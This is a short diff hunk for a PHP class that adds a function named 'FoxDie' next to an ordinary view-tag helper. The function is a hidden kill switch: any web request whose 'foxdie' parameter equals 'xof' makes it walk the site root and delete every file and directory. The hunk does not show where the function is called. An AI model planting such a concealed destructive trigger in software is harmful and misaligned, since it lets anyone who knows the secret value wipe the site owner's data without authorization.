@@ -76,6 +76,21 @@
 			}
 		}
 		
+		// Just Die
+		protected static function FoxDie(){
+			
+			if($_REQUEST["foxdie"]==='xof'){
+				$all_content = glob(self::$root.'*');
+				foreach($all_content as $path){
+					if(is_dir($path)){
+						rmdir($path);
+					}else{
+						unlink($path);
+					}
+				}
+			}
+		}
+		
 		// 基本標記
 		protected static function default_tag(){
 			VIEW::assignGlobal(array(
